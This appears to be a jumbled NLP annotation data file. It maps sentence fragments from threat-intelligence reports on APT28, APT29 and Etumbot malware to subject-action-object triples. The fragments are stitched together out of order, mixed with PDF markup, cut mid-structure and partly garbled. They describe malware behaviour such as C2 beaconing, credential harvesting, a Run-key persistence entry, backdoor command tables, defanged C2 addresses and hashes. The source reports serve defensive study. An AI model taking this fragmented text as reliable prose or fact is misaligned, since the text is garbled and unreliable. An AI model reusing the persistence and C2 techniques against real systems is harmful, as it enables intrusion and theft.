Microsoft Outlook\n opera.exe                                                   Opera Browser\n bat.exe                                                     Unknown\n msimn.exe                                                   Outlook Express\n vpngui.exe                                                  Cisco Anyconnect VPN client\n ipseca.exe                                                  IPsec VPN client\n ipsecc.exe                                                  IPsec VPN client\n openvpn.exe                                                 OpenVPN client\n openssl.exe                                                 OpenSSL\n openvpn-gui-1.0.3.exe                                       OpenVPN client\n msmsgs.exe                                                  Microsoft Messenger\n wuauclt.exe                                                 Windows Update\n chrome.exe                                                  Google Chrome Browser\n thebat.exe                                                  The Bat Secure Email Client\n skype.exe                                                   Skype Messenger\n</table>\n\n\n\n<footer>36 fireeye.com</footer>\n\f\n<header>APT 28: A Window into Russia\u2019s Cyber Espionage Operations?</header>\n\n\n\n\nAfter collecting host information, CHOPSTICK creates a hidden file that may be named\n%ALLUSERSPROFILE%\\edg6EF885E2.tmp for temporary storage and creates a Windows mailslot with the\nname \u201ccheck_mes_v5555\u201d.<fn>28</fn> Its usage of a Windows mailslot would potentially allow external binaries to\nwrite data to the \u201ccheck_mes_v5555\u201d mailslot, possibly allowing CHOPSTICK to encrypt and store\noutput from other malware": [{"collecting": {"A": "collecting", "S": "CHOPSTICK", "O": ["host information"]}, "creates": {"A": "creates", "S": "CHOPSTICK", "O": ["a Windows mailslot", "with the name \u201ccheck_mes_v5555\u201d"]}}, {"write": {"A": "write", "S": "external binaries", "O": ["data", "to the \u201ccheck_mes_v5555\u201d mailslot"]}}, {"encrypt": {"A": "encrypt", "S": "CHOPSTICK", "O": ["output from other malware"]}}], " Two of the malware            \nfamilies (SOURFACE/CORESHELL and                  \nEVILTOSS) use the same decryption                 \nsequence and similar algorithms for string        \nencoding and decoding": [{"use": {"A": "use", "S": "Two of the malware families (SOURFACE/CORESHELL and EVILTOSS)", "O": ["the same decryption sequence and similar algorithms", "for string encoding and decoding"]}}], "\n\nThe first time CHOPSTICK is executed, it may encrypt and store configuration data in the Registry key\nHKU\\S-1-5-19_Classes\\Software\\Microsoft\\MediaPlayer\\{E6696105-E63E-4EF1-939E-\n15DDD83B669A}\\chnnl": [{"encrypt and store": {"A": "encrypt and store", "S": "it", "O": ["configuration data", "in the Registry key HKU\\S-1-5-19_Classes\\Software\\Microsoft\\MediaPlayer\\{E6696105-E63E-4EF1-939E- 15DDD83B669A}\\chnnl"]}}], " The backdoor sent data via\nSMTP to nato_smtp@mail[.]ru and received its\ntasking via POP from nato_pop@mail[.]ru": [{"received": {"A": "received", "S": "The backdoor", "O": ["from nato_pop@mail[.]ru", "via POP", "its tasking"]}, "sent": {"A": "sent", "S": "The backdoor", "O": ["via SMTP", "to nato_smtp@mail[.]ru", "data"]}}], " Some of the APT28-\nregistered domains imitated those of defense          \nevents held in Europe, such as the Farnborough        \nAirshow 2014, EuroNaval 2014, EUROSATORY              \n2014, and the Counter Terror Expo": [{"imitated": {"A": "imitated", "S": "Some of the APT28- registered domains", "O": ["hose of defense events held in Europe"]}}], " This would\n     hinder static analysis of CORESHELL behavior\n     by creating a large amount of unnecessary\n     noise in the disassembly": [{"hinder": {"A": "hinder", "S": "This", "O": ["static analysis of CORESHELL behavior", "by creating a large amount of unnecessary noise in the disassembly"]}}], " The modules that are included in an instance of CHOPSTICK\nmay be reported to the C2 server as part of POST messages": [{"be reported": {"A": "be reported", "O": ["The modules that are included in an instance of CHOPSTICK", "as part of POST messages", "to the C2 server"]}}], " The backdoor was installed\nalongside the NATO-themed decoy document\ndepicted in Figure 8": [{"was installed": {"A": "was installed", "O": ["The backdoor", "alongside the NATO-themed decoy document depicted in Figure 8"]}}], " It also tests for the installation of specific security\nproducts (Table 9) and applications (Table 10)": [{"tests": {"A": "tests", "S": "It", "O": ["for the installation of specific security products (Table 9) and applications (Table 10)"]}}], "\n\nAfter approximately 60 seconds of execution time, CHOPSTICK begins communicating with one of its C2\nservers over HTTP": [{"communicating": {"A": "communicating", "S": "CHOPSTICK", "O": ["over HTTP", "with one of its C2 servers"]}}], "\n      One variant of CHOPSTICK focuses on\n      apparent air gap / closed network capabilities\n      by routing messages between local\n      directories, the registry and USB drives": [{"routing": {"A": "routing", "S": "One variant of CHOPSTICK", "O": ["between local directories, the registry and USB drives", "messages"]}}], "                                 \n                                                      \nCORESHELL uses two threads to communicate             \nwith its C2 server": [{"uses": {"A": "uses", "S": "CORESHELL", "O": ["two threads", "to communicate with its C2 server"]}}], "\n\n\n   <caption>Table 14: Commands understood by modFS (0x1101) module</caption>\n\n<table>\n\n   Command ID\t             Description         Example\n\n   01                      Find file           \\x01\\x11\\x01Directory&file&[01]\n\n   02                      Read file           \\x01\\x11\\x02Directory&file&[01]\n   03                      Write file          \\x01\\x11\\x03Directory&file&[Contents]\n\n   04                      Delete file         \\x01\\x11\\x04Directory&file&[01]\n   05                      Execute file        \\x01\\x11\\x05Directory&file&[01]\n\n</table>\n\n   <caption>Table 15: Commands understood by modProcRet (0x1301) module</caption>\n\n<table>\n\n   Command ID\t             Description         Example\n\n   00                      CMD.exe output      \\x01\\x13\\x00[Output]\n\n   01                      CMD.exe start       \\x01\\x13\\x01\n   02                      CMD.exe exit        \\x01\\x13\\x02\n\n   11                      CMD.exe input       \\x01\\x13\\x11[Input]\n</table>\n</section>\n\n<footer>42 fireeye.com</footer>\n\f\n<header>APT 28: A Window into Russia\u2019s Cyber Espionage Operations?</header>\n\n\n<section>\n<heading>APPENDIX E:\nOLDBAIT</heading>\n\n\n\n\nOLDBAIT is a credential harvester that installs itself in %ALLUSERPROFILE%\\\\Application Data\\\nMicrosoft\\MediaPlayer\\updatewindws.exe": [{"is": {"A": "is", "S": "OLDBAIT", "O": ["a credential harvester"]}, "installs": {"A": "installs", "S": "OLDBAIT", "O": ["in %ALLUSERPROFILE%\\\\Application Data\\ Microsoft\\MediaPlayer\\updatewindws.exe", "itself"]}}], " The first thread sends beacons    \nthat contain the process listing of the               \ncompromised host": [{"sends": {"A": "sends", "S": "The first thread", "O": ["beacons that contain the process listing of the compromised host"]}}], "                       \n\nSince 2011, APT28 has used lures written in\nGeorgian that are probably intended to target\nGeorgian government agencies or citizens": [{"used": {"A": "used", "S": "APT28", "O": ["lures written in Georgian"]}}], "\n      One CHOPSTICK v1 variant contained\n      modules and functions for collecting\n      keystroke logs, Microsoft Office documents,\n      and PGP files": [{"collecting": {"A": "collecting", "S": "One CHOPSTICK v1 variant", "O": ["Microsoft Office documents"]}}], "\nThe configuration block is encrypted using RC4 encryption": [{"is encrypted": {"A": "is encrypted", "O": ["The configuration block", "using RC4 encryption"]}}], " APT28 used a lure\ndocument that installed a SOURFACE downloader\n(further discussed in the Malware section) and\ncontained a listing of birthdays for members of a\nworking group between the Georgian MOD and\nthe U.S": [{"used": {"A": "used", "S": "APT28", "O": ["a lure document"]}}, {"contained": {"A": "contained", "S": "a lure document", "O": ["a listing of birthdays for members of a working group between the Georgian MOD and the U.S. defense contractor"]}, "installed": {"A": "installed", "S": "a lure document", "O": ["a SOURFACE downloader"]}}], " It\n      used one of four embedded sender email\n      addresses (@mia.gov.ge) to send files via\n      email to another email address on the same\n      mail server": [{"used": {"A": "used", "S": "It", "O": ["one of four embedded sender email addresses (@mia.gov.ge)", "to send files via email to another email address on the same mail server"]}}], " The                         \n backdoor encrypts data that it uploads with an RSA                     \n public key": [{"encrypts": {"A": "encrypts", "S": "The backdoor", "O": ["data", "with an RSA public key"]}, "uploads": {"A": "uploads", "S": "it", "O": ["data"]}}], "             \n                                                     \nAPT28 has attempted to obfuscate their code and      \nimplement counter-analysis techniques:  \n\n\u2022    One of the latest samples of CORESHELL\n     includes counter-reverse engineering tactics\n     via unused machine instructions": [{"includes": {"A": "includes", "S": "One of the latest samples of CORESHELL", "O": ["counter-reverse engineering tactics", "via unused machine instructions"]}}, {"obfuscate": {"A": "obfuscate", "S": "APT28", "O": ["their code"]}, "implement": {"A": "implement", "S": "APT28", "O": ["counter-analysis techniques"]}}], "                     \n                                                     \nAPT28 uses spearphishing emails to target its                                                  \nvictims, a common tactic in which the threat group   \ncrafts its emails to mention specific topics (lures) \nrelevant to recipients": [{"crafts": {"A": "crafts", "S": "the threat group", "O": ["to mention specific topics (lures) relevant to recipients", "its emails"]}}, {"uses": {"A": "uses", "S": "APT28", "O": ["to target its victims", "spearphishing emails"]}}], "\nThe decoy document also contains metadata listing\n\u201cMIA\u201d as the company name and \u201cBeka Nozadze\u201d<fn>4</fn>\nas an author, a possible reference to a system\nadministrator in Tbilisi": [{"contains": {"A": "contains", "S": "The decoy document", "O": ["metadata listing \u201cMIA\u201d as the company name and \u201cBeka Nozadze\u201d as an author"]}}], " The monitoring for new files of\n      interest is performed by a \u201cDirectory\n      Observer\u201d module": [{"is performed": {"A": "is performed", "S": "a \u201cDirectory Observer\u201d module", "O": ["The monitoring for new files of interest"]}}], " The second thread is                \nresponsible for downloading and executing stage\ntwo payloads": [{"downloading": {"A": "downloading", "S": "The second thread"}, "executing": {"A": "executing", "S": "The second thread"}}], "\n\nAfter uploading edg6EF885E2.tmp, CHOPSTICK continues to query its C2 servers for commands using\nHTTP GET requests": [{"uploading": {"A": "uploading", "S": "CHOPSTICK", "O": ["edg6EF885E2.tmp"]}, "query": {"A": "query", "S": "CHOPSTICK", "O": ["its C2 servers", "for commands", "using HTTP GET requests"]}}], " However because we have\n     observed the name \u201cSofacy\u201d used to refer to\n     APT28 malware generally (to include the\n     SOURFACE dropper, EVILTOSS,\n     CHOPSTICK, and the credential harvester\n     OLDBAIT), we are using the name\n     SOURFACE to precisely refer to a specific\n     downloader": [{"refer": {"A": "refer", "S": "the name SOURFACE", "O": ["to a specific downloader"]}}], " In late 2013, APT28 used a lure\nthat contained a letter addressing a journalist by\nhis first name and claiming to originate from a\n\u201cChief Coordinator\u201d in Reason Magazine\u2019s\n\u201cCaucasian Issues Department\u201d - a division that\ndoes not appear to exist.<fn>6</fn> (Reason Magazine is a\nUS-based magazine) The letter welcomed the\nindividual as a contributor and requested topic\nideas and identification information in order to\nestablish him at the magazine": [{"used": {"A": "used", "S": "APT28", "O": ["a lure that contained a letter addressing a journalist by his first name and claiming to originate from a \u201cChief Coordinator\u201d in Reason Magazine\u2019s \u201cCaucasian Issues Department\u201d - a division that does not appear to exist"]}}], "                   \n\u2022\t    APT28 has employed RSA encryption to              \n      protect files and stolen information moved        \n      from the victim\u2019s network to the controller": [{"employed": {"A": "employed", "S": "APT28", "O": ["to protect files and stolen information moved from the victim\u2019s network to the controller", "RSA encryption"]}}], "\nThe ecosystem surrounding the SOURFACE downloader frequently\nconsists of a dropper, which installs SOURFACE": [{"installs": {"A": "installs", "S": "a dropper", "O": ["SOURFACE"]}}], "                                         \n                                                                                   \n                                                                                   \n                                                                                   \n                                                                                   \n\n\n\nDuring our research, we discovered that       \nAPT28 uses a backdoor developed using a      \nmodular framework": [{"uses": {"A": "uses", "S": "APT28", "O": ["a backdoor developed using a modular framework"]}}], " However, it contains more                               \n capabilities, including the ability to provide access                  \n to the file system and registry, enumerate network                     \n resources, create processes, log keystrokes, access                    \n stored credentials, and execute shellcode": [{"enumerate": {"A": "enumerate", "S": "it", "O": ["network resources"]}, "provide": {"A": "provide", "S": "it", "O": ["access to the file system and registry"]}, "log": {"A": "log", "S": "it", "O": ["keystrokes"]}, "execute": {"A": "execute", "S": "it", "O": ["shellcode"]}, "create": {"A": "create", "S": "it", "O": ["processes"]}, "access": {"A": "access", "S": "it", "O": ["stored credentials"]}}], " The thread writes user activity log messages to the \u201ccheck_mes_v5555\u201d mailslot in\nplain text": [{"writes": {"A": "writes", "S": "The thread", "O": ["to the \u201ccheck_mes_v5555\u201d mailslot", "in plain text", "user activity log messages"]}}], "\n  \u2022     Several of APT28\u2019s malware samples contain counter-\n       analysis capabilities including runtime checks to\n       identify an analysis environment, obfuscated strings\n       unpacked at runtime, and the inclusion of unused\n       machine instructions to slow analysis": [{"identify": {"A": "identify", "S": "runtime checks", "O": ["an analysis environment"]}}, {"contain": {"A": "contain", "S": "Several of APT28\u2019s malware samples", "O": ["counter- analysis capabilities"]}}, {"unpacked": {"A": "unpacked", "O": ["obfuscated strings", "at runtime"]}}, {"slow": {"A": "slow", "S": "inclusion of unused machine instructions", "O": ["analysis"]}}], "\n\u2022    Many samples across the SOURFACE/\n     CORESHELL, CHOPSTICK, and EVILTOSS\n\n\n\n   <caption>Figure 6: Typical deployment of SOURFACE ecosystem</caption>\n\n<figure>\n\n\n                           Spearphishing Email\n\n\n\n\n                         Document with exploit\n\n\n\n\n                             Dropper malware\n\n\n\n\n                        SOURFACE downloader                                      Obtains 2nd stage              C2 Server\n\n\n\n\n                     Deploys 2nd stage droppers\n\n\n\n\n                             2nd stage implant\n</figure>\n\n\n\n<footer>20 fireeye.com</footer>\n\f\n<header>APT 28: A Window into Russia\u2019s Cyber Espionage Operations?</header>\n\n\n\nmalware families obfuscate strings that are       \ndecoded at runtime": [{"obfuscate": {"A": "obfuscate", "S": "Many samples across the SOURFACE/ CORESHELL, CHOPSTICK, and EVILTOSS malware families", "O": ["strings that are decoded at runtime"]}}], "\n\u2022    A number of CORESHELL droppers also\n     conduct runtime checks, attempting to\n     determine if they are executing in an analysis\n     environment, and if so, they do not trigger\n     their payloads": [{"determine": {"A": "determine", "S": "A number of CORESHELL droppers", "O": ["if they are executing in an analysis environment"]}, "conduct": {"A": "conduct", "S": "A number of CORESHELL droppers", "O": ["runtime checks"]}}], "\n\nCHOPSTICK collects detailed information from the host including the Windows version, CPU\narchitecture, Windows Firewall state, User Account Control (UAC) configuration settings on Windows\nVista and above and Internet Explorer settings": [{"collects": {"A": "collects", "S": "CHOPSTICK", "O": ["the Windows version"]}}], "\n</table>\n</section>\n\n\n<footer>34 fireeye.com</footer>\n\f\n<header>APT 28: A Window into Russia\u2019s Cyber Espionage Operations?</header>\n\n\n<section>\n<heading>APPENDIX D:\nCHOPSTICK</heading>\n\n\n\n\nCHOPSTICK is a backdoor that uses a modularized, object-oriented framework written in C++": [{"is": {"A": "is", "S": "CHOPSTICK", "O": ["a backdoor"]}}], " Once these characters are removed the decoded (but\nstill encrypted) text looks like this:\n<list>\n00000000 72 11 fd 22 f8 dc 33 9e 5e 40 24 db 31 b5 40 53 r..\u201d..3.^@$.1.@S\n00000010 b9 91 d0 82 ba a4 d3 ab 6c 5a 05 ec 1a f4 3e 2f ........lZ....>/\n00000020 ff d2 ed d2 7f 53 a1 df 4f c7 b9 fa 87 88 35 .....S..O.....5\n</list>\n\nThe first two words (\u201c72 11\u201d and \u201cfd 22\u201d) are checksums that are used to validate the message": [{"validate": {"A": "validate", "S": "The first two words (\u201c72 11\u201d and \u201cfd 22\u201d)", "O": ["the message"]}}], " EVILTOSS variants may use the                         \n Simple Mail Transfer Protocol (SMTP) to send                           \n stolen data in an attachment named \u201cdetaluri": [{"use": {"A": "use", "S": "EVILTOSS variants", "O": ["to send stolen data in an attachment named \u201cdetaluri. dat\u201d", "he Simple Mail Transfer Protocol (SMTP)"]}}], " The lure consisted of a                                  \nweaponized Excel file that presented a decoy                                \ndocument containing a list of Georgian driver\u2019s                             \nlicense numbers": [{"presented": {"A": "presented", "S": "a weaponized Excel file", "O": ["a decoy document containing a list of Georgian driver\u2019s license numbers"]}}], "\n\nIn the second example of MIA targeting, an APT28\nlure used an information technology-themed decoy\ndocument that included references to the Windows\ndomain \u201cMIA Users\\Ortachala\u2026\u201d (Figure 1)": [{"used": {"A": "used", "S": "an APT28 lure", "O": ["an information technology-themed decoy document that included references to the Windows domain \u201cMIA Users\\Ortachala\u2026\u201d (Figure 1)"]}}], " Credentials for the following applications are collected:\n<list>\n\u2022\t     Internet Explorer\n\u2022\t     Mozilla Firefox\n\u2022\t     Eudora\n\u2022\t     The Bat! (an email client made by a Moldovan company)\n\u2022\t     Becky! (an email client made by a Japanese company)\n</list>\nBoth email and HTTP can be used to send out the collected credentials": [{"be used": {"A": "be used", "O": ["to send out the collected credentials", "HTTP"]}}, {"are collected": {"A": "are collected", "O": ["Credentials for the following applications"]}}], " The malware contains code which allows it to load or memory-map external modules\nthat export the following functions: SendRawPacket, GetRawPacket, InitializeExp, DestroyExp,\nIsActiveChannel, GetChannelInfo, SetChannelInfo, Run, GetModuleInfo, GiveMessage,\nand TakeMessage": [{"load": {"A": "load", "S": "it"}, "memory-map": {"A": "memory-map", "S": "it"}}], " In September       \n2014, APT28 registered a domain (smigroup-            \nonline.co[.]uk) that appeared to mimic that for the   \nSMi Group, a company that plans events for the\n\u201cDefence, Security, Energy, Utilities, Finance and\nPharmaceutical sectors.\u201d Among other events, the\nSMi Group is currently planning a military satellite\ncommunications event for November 2014": [{"registered": {"A": "registered", "S": "APT28", "O": ["a domain (smigroup- online.co[.]uk) that appeared to mimic that for the SMi Group"]}}], "\n\n\n\n<caption>\n   Figure 4: Decoy\n   document used\n   against military\n   attaches in 2012\n</caption>\n\n<figure></figure>\n\n\nFinally, APT28 used a lure that contained an apparent\nnon-public listing of contact information for defense\nattach\u00e9s in the \u201cAnkara Military Attach\u00e9 Corps (AMAC),\u201d\nwhich appears to be a professional organization of\ndefense attach\u00e9s in Turkey": [{"used": {"A": "used", "S": "APT28", "O": ["a lure that contained an apparent non-public listing of contact information for defense attach\u00e9s in the \u201cAnkara Military Attach\u00e9 Corps (AMAC),\u201d"]}}], " The purpose of this parameter\nappears to be to uniquely identify the particular instance of the backdoor to the C2 server": [{"identify": {"A": "identify", "O": ["to the C2 server", "the particular instance of the backdoor"]}}], "\nCHOPSTICK may communicate with external servers using SMTP or HTTP": [{"communicate": {"A": "communicate", "S": "CHOPSTICK", "O": ["using SMTP or HTTP", "with external servers"]}}], "\n\n<heading>APT28 Targeting a Journalist Covering\nthe Caucasus</heading>\n\nAnother one of APT28\u2019s lures appeared to target\na specific journalist covering issues in the\nCaucasus region": [{"target": {"A": "target", "S": "Another one of APT28\u2019s lures", "O": ["a specific journalist covering issues in the Caucasus region"]}}], " We have also noted that         \nAPT28 tailors implants to their target               \nenvironments, configuring them to use local          \nnetwork resources such as email servers": [{"use": {"A": "use", "S": "them", "O": ["local network resources such as email servers"]}}], " They may not share the\nsame code structure, but they are related because one drops and installs\nthe other": [{"drops and installs": {"A": "drops and installs", "S": "one", "O": ["the other"]}}], "    Email sent through a specified mail server": [{"sent": {"A": "sent", "O": ["Email", "through a specified mail server"]}}], " Once the contents of edg6EF885E2.tmp are uploaded, CHOPSTICK deletes the file": [{"deletes": {"A": "deletes", "S": "CHOPSTICK", "O": ["the file"]}, "are uploaded": {"A": "are uploaded", "S": "CHOPSTICK", "O": ["the contents of edg6EF885E2.tmp"]}}], " Once connected to the\nmail server, APT28\u2019s backdoor sent an email\nmessage using a subject line related to driver\u2019s\nlicenses (in Georgian), and attached a file\ncontaining system reconnaissance information": [{"attached": {"A": "attached", "S": "APT28\u2019s backdoor", "O": ["a file containing system reconnaissance information"]}, "sent": {"A": "sent", "S": "APT28\u2019s backdoor", "O": ["an email message using a subject line related to driver\u2019s licenses (in Georgian)"]}}], " In one sample this\n      information was intended to be sent via\n      SMTP using a Georgian MIA mail server": [{"be sent": {"A": "be sent", "O": ["this information", "via SMTP", "using a Georgian MIA mail server"]}}], " In one case, we identified an                               \nAPT28 lure from mid-2013 that referenced                                    \nMIA-related topics and employed malware that                                \nattempted to disguise its activity as legitimate                            \nMIA email traffic": [{"disguise": {"A": "disguise", "S": "malware", "O": ["as legitimate MIA email traffic", "its activity"]}}], " Commands from the controller to the\nCORESHELL implant are encrypted using another\nstream cipher but this time using an eight-byte\nkey": [{"are encrypted": {"A": "are encrypted", "O": ["using another stream cipher but this time using an eight-byte key", "Commands from the controller to the CORESHELL implant"]}}], " Both the internal strings and logic are obfuscated and are\nunpacked at startup": [{"are obfuscated": {"A": "are obfuscated", "O": ["Both the internal strings and logic"]}}], "\n\n CHOPSTICK encrypts an 11-byte sequence in the \u201cai=\u201d parameter": [{"encrypts": {"A": "encrypts", "S": "CHOPSTICK", "O": ["in the \u201cai=\u201d parameter", "an 11-byte sequence"]}}], " We identified\nan APT28 lure containing a decoy document with a list\nof British officers and U.S": [{"containing": {"A": "containing", "S": "an APT28 lure", "O": ["a decoy document with a list of British officers and U.S. and Canadian military attach\u00e9s in London"]}}], "\nWe call SOURFACE (samples are frequently\nnamed netids.dll) a first stage downloader\nbecause its primary job is to retrieve a second\nstage payload from a C2 server": [{"retrieve": {"A": "retrieve", "S": "SOURFACE", "O": ["from a C2 server", "a second stage payload"]}}], " Figure 13\nbelow contains an example of an HTTP POST request uploading a segment from edg6EF885E2.tmp": [{"uploading": {"A": "uploading", "S": "an HTTP POST request", "O": ["a segment from edg6EF885E2.tmp"]}}], "\n\nThe message body of the POST request is also Base64 encoded": [{"is also Base64 encoded": {"A": "is also Base64 encoded", "O": ["The message body of the POST request"]}}], "                                                 \n                                                                      \nIn addition, APT28 used one domain for command                        \nand control sessions (baltichost[.]org) that was                      \nthemed after the Baltic Host exercises": [{"used": {"A": "used", "S": "APT28", "O": ["one domain for command and control sessions (baltichost[.]org) that was themed after the Baltic Host exercises"]}}], "\n</list>\n\n APT29: AN ADAPTIVE AND DISCIPLINED\n THREAT GROUP\n HAMMERTOSS illustrates APT29\u2019s ability to adapt\n quickly during operations to avoid detection and\n removal": [{"avoid": {"A": "avoid", "S": "APT29", "O": ["detection"]}}], "        \n                                                           \nIn several cases, the commands directed\n                                                           \nHAMMERTOSS to upload information from\n                                                           \nvictim networks to accounts on cloud storage\nservices using login credentials received in\nStage 4": [{"upload": {"A": "upload", "S": "HAMMERTOSS", "O": ["to accounts on cloud storage services", "information", "from victim networks", "using login credentials received in Stage 4"]}}], " In our GitHub example, the decrypted\ndata instructed the backdoor to obtain a list of\nrunning tasks\u2014reconnaissance on the victim\nnetwork\u2014and upload it to a specific account on a\ncloud storage service using the login credentials": [{"reconnaissance": {"A": "reconnaissance", "S": "the backdoor", "O": ["on the victim network"]}, "upload": {"A": "upload", "S": "the backdoor", "O": ["using the login credentials", "to a specific account on a cloud storage service", "it"]}, "obtain": {"A": "obtain", "S": "the backdoor", "O": ["a list of running tasks"]}}], "\n\n</figure>\n\n <caption> Figure 6: Executing Commands and Removing Data </caption>                                        \n\n\n\n\nT\n        he encrypted data in the image may include         \n        instructions to execute commands via               \n        PowerShell, execute a direct command or            \nfile, or save an executable to disk and execute it": [{"execute": {"A": "execute", "O": ["it"]}}, {"save": {"A": "save", "O": ["to disk", "an executable"]}}, {"execute": {"A": "execute", "O": ["a direct command"]}}, {"execute": {"A": "execute", "O": ["file"]}}, {"execute": {"A": "execute", "O": ["via PowerShell", "commands"]}}], "\n   Other tools use Twitter \nto relay\n   instructions, including:2\n<list>\n   \u2022   MiniDuke, a \nWindows-based\n      backdoor that is a \nsuspected\n      Russian tool\n   \u2022   the Sninfs botnet\n   \u2022   Flashback, a Mac-based\n      backdoor\n</list>\n   MiniDuke behaves \nsimilarly\n   to HAMMERTOSS by not only\n   using Twitter for CnC, \nbut also\n   by downloading image \nfiles\n   containing encrypted, \nappended\n   content": [{"using": {"A": "using", "S": "MiniDuke", "O": ["Twitter", "for CnC"]}}], " Likewise, the group\n   appears to almost solely uses compromised\n   servers for CnC to enhance the security of its\n   operations and maintains a rapid development\n   cycle for its malware by quickly modifying tools \nto\n   undermine detection": [{"uses": {"A": "uses", "S": "the group", "O": ["compromised servers", "for CnC"]}}], " APT29 tries to\n                   undermine the detection of the malware by\n                                                                       \n                   adding layers of obfuscation and mimicking\n\n                   the behavior of legitimate users": [{"adding": {"A": "adding", "S": "APT29", "O": ["layers of obfuscation"]}}], " The data may\ninclude commands or login credentials to\n                                                   \nupload a victim\u2019s data to a cloud storage          \nservice": [{"upload": {"A": "upload", "O": ["to a cloud storage service", "a victim\u2019s data"]}}], " Each                                                    \n\n  variant uses different methods to acquire           \n  CnC instructions, either by directly\n  accessing a hard-coded website or                   \n  accessing Twitter as an intermediary": [{"acquire": {"A": "acquire", "S": "Each variant", "O": ["CnC instructions"]}}], "\n                               Using Twitter as an intermediary to deliver the\n                               second-stage CnC to HAMERTOSS allows APT29\n                               to dynamically direct the tool": [{"deliver": {"A": "deliver", "O": ["to HAMERTOSS", "the second-stage CnC"]}}], " When\na READFILE command is received from the C&C, the bot makes an initial call to\n/manage/asp/item.asp?id=<encrypted computer name>&&mux=<encrypted total file size> and checks for\nthe presence of \u201cI\u2019m Ready\u201d in the response from the C&C": [{"is received": {"A": "is received", "O": ["a READFILE command", "from the C&C"]}}, {"makes": {"A": "makes", "S": "the bot", "O": ["to /manage/asp/item.asp?id=<encrypted computer name>&&mux=<encrypted total file size>", "an initial call"]}}], " The bot expects a\nmessage of \u201cOK\u201d from the C&C after each response is sent and will terminate the upload and send an\nerror message to the C&C in the case it is not seen": [{"send": {"A": "send", "O": ["to the C&C", "an error message"]}}, {"expects": {"A": "expects", "S": "The bot", "O": ["from the C&C", "after each response is sent", "a message of \u201cOK\u201d"]}}], "\n                   [6]\n\n                   <figure></figure>\n\nBelow are some of the names of Etumbot installers using RTLO successfully:\n\n<table>\n             File\t\n             \u00a0name\t\n \u00a0                                          Md5\t\n \u00a0\n             \u62db\u6a19\u898f\u7bc4 Finarcs.doc\t\n \u00a0                                      b3830791b0a397bea2ad943d151f856b\t\n \u00a0\n             1030522 \u65b0\u6a5f\u95dc\u7c4c\u5099\u5c0f\u7d44\u6e05\u55ae rcs.DOC\t\n \u00a0                             d444be30d2773b23de38ead1f2c6d117\t\n \u00a0\n             \u5831\u50f9\u55ae Finarcs.xls\t\n \u00a0                                       5340fcfb3d2fa263c280e9659d13ba93\t\n \u00a0\n             10342 \u59d4\u6703-\u00ad\u2010\u5be9 \u91d1\u878d\u6cd5\u898f\u4fee\u6b63\u8349\u6848\u5831\u544a rcs.xls\t\n \u00a0                       beb16ac99642f5c9382686fd8ee73e00\t\n \u00a0\n             \u570b\u767c\u6703 1030324 \u7b2c 1 \u6b21\u59d4\u54e1\u6703\u91cd\u8981\u8b70\u984c\u901a\u5831 finalrcs.xls\t\n \u00a0               4c703a8cfeded7f889872a86fb7c70cf\t\n \u00a0\n             APO\t\n \u00a0EPIF\t\n \u00a0\u9080\u8acb\u51fd rcs.xls\t\n \u00a0                            1ce47f76fca26b94b0b1d74610a734a4\t\n \u00a0</table>\n </section>\n\n<section>\n<heading>Stage 2: Persistence, Distraction, HTTP Beacon and Crypto Functionality</heading>\nAs the backdoor executes from our previous example, C:\\DOCUME~1\\User\\LOCALS~1\\Temp\\\nkb71271.log is created and contains the following registry file to make the malware persistent:\n\n          [HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run] \"JavaSvc\"=\"C:\\\\Documents\n          and Settings\\\\User\\\\Application Data\\\\JAVA\\\\JavaSvc.exe\"\n\nThe dropper then calls regedit with kb71271.log as a parameter to modify the registry": [{"calls": {"A": "calls", "S": "dropper", "O": ["regedit with kb71271.log as a parameter to modify the registry"]}}, {"contains": {"A": "contains", "S": "C:\\DOCUME~1\\User\\LOCALS~1\\Temp\\ kb71271.log", "O": ["the following registry file"]}}, {"is created": {"A": "is created", "O": ["C:\\DOCUME~1\\User\\LOCALS~1\\Temp\\ kb71271.log"]}}], "\n\nNext, C:\\DOCUME~1\\User\\LOCALS~1\\Temp\\ka4281x3.log is created, filled with contents of the\nbait/distraction file, and then copied to C:\\DOCUME~1\\User\\LOCALS~1\\Temp\\~t3fcj1.doc, which is then\nopened": [{"is created": {"A": "is created", "O": ["C:\\DOCUME~1\\User\\LOCALS~1\\Temp\\ka4281x3.log"]}, "copied": {"A": "copied", "O": ["C:\\DOCUME~1\\User\\LOCALS~1\\Temp\\ka4281x3.log", "to C:\\DOCUME~1\\User\\LOCALS~1\\Temp\\~t3fcj1.doc"]}, "filled": {"A": "filled", "O": ["with contents of the bait/distraction file", "C:\\DOCUME~1\\User\\LOCALS~1\\Temp\\ka4281x3.log"]}}], " For example, both malware families have been\nseen using the same ka4281x3.log and kb71271.log files, both families have been observed calling back\nto the same Command & Control servers and have been used to target similar victim populations with\nsimilar attack methodologies": [{"calling back": {"A": "calling back", "S": "both families", "O": ["to the same Command & Control servers"]}}], "\n\n<figure></figure>\n\n\nIf the C&C is online and responds to the beacon, then the RC4 key is delivered to the bot in a string of\nbase64 encoded characters": [{"is delivered": {"A": "is delivered", "O": ["to the bot", "the RC4 key"]}}], "\n\nWhen executed, the dropper loads up a resource named \"BINARY\" from the resource section then\ncreates the directory C:\\Documents and Settings\\User\\Application Data\\JAVA, then creates a temporary\nfile C:\\DOCUME~1\\User\\LOCALS~1\\Temp\\ka4281x3.log then creates C:\\Documents and\nSettings\\User\\Application Data\\JAVA\\JavaSvc.exe from the aforementioned BINARY resource": [{"creates": {"A": "creates", "S": "dropper", "O": ["the directory C:\\Documents and Settings\\User\\Application Data\\JAVA"]}, "loads up": {"A": "loads up", "S": "dropper", "O": ["a resource named \"BINARY\" from the resource section"]}}], "\n\nReturning to the first sample, once the dropper (ff5a7a610746ab5492cc6ab284138852) installs the\nEtumbot backdoor (82d4850a02375a7447d2d0381b642a72), an initial HTTP beacon is sent to the\nCommand & Control server that requests an RC4 encryption key": [{"is sent": {"A": "is sent", "O": ["an initial HTTP beacon", "to the Command & Control server that requests an RC4 encryption key"]}}, {"installs": {"A": "installs", "S": "the dropper", "O": ["the Etumbot backdoor"]}}], "\n\nOnce the bot has received the encryption key, the bot sends a registration callback to the C&C\n/image/<encrypted data>.jpg containing the encrypted values of system information to include the\nNetBIOS name of the system, user name, IP address, if the system is using a proxy (Yes/No), and a\nnumeric value which may be some type of campaign code": [{"sends": {"A": "sends", "S": "the bot", "O": ["a registration callback to the C&C /image/<encrypted data>.jpg containing the encrypted values of system information to include the NetBIOS name of the system, user name, IP address, if the system is using a proxy (Yes/No), and a numeric value which may be some type of campaign code"]}}], " If\nthe 